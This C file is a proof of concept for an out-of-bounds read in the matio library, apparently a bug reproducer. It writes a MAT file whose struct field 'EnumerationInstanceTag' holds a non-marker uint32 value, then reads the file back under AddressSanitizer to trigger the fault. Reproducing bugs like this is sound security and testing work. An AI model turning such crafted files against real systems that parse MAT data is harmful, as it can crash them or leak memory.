/* PoC: out-of-bounds read reachable through the public matio read API.
 *
 * Writes a v5 MAT file containing a struct whose "EnumerationInstanceTag"
 * field is a 1x1 uint32 that does NOT hold the MCOS reference marker, then
 * reads it back with Mat_Open + Mat_VarReadNext.  The read path runs the
 * enumeration-instance detection over the tag field.
 *
 * cmd: cc -I../src -I../build/src newbug.c ../build/libmatio.a -lz \
 *          -fsanitize=address -o newbug && ./newbug /tmp/poc_newbug.mat
 */
#include <stdio.h>
#include <stdlib.h>
#include "matio.h"

int
main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "/tmp/poc_newbug.mat";
    size_t field_dims[2] = {1, 1};
    size_t struct_dims[2] = {1, 1};
    const char *fieldnames[1] = {"EnumerationInstanceTag"};
    mat_uint32_t tag_value = 0x11111111u; /* not MCOS_REF_VALUE (0xDD000000) */
    mat_t *mat;
    matvar_t *tag, *s, *readback;

    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT5);
    if ( mat == NULL ) {
        fprintf(stderr, "could not create %s\n", path);
        return 2;
    }

    s = Mat_VarCreateStruct("e", 2, struct_dims, fieldnames, 1);
    if ( s == NULL ) {
        fprintf(stderr, "struct create failed\n");
        return 2;
    }

    tag = Mat_VarCreate(NULL, MAT_C_UINT32, MAT_T_UINT32, 2, field_dims, &tag_value, 0);
    if ( tag == NULL ) {
        fprintf(stderr, "tag create failed\n");
        return 2;
    }
    Mat_VarSetStructFieldByName(s, "EnumerationInstanceTag", 0, tag);

    if ( Mat_VarWrite(mat, s, MAT_COMPRESSION_NONE) != 0 ) {
        fprintf(stderr, "write failed\n");
        return 2;
    }
    Mat_VarFree(s);
    Mat_Close(mat);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        fprintf(stderr, "could not open %s\n", path);
        return 2;
    }

    while ( (readback = Mat_VarReadNext(mat)) != NULL ) {
        Mat_VarFree(readback);
    }

    Mat_Close(mat);
    printf("done\n");
    return 0;
}
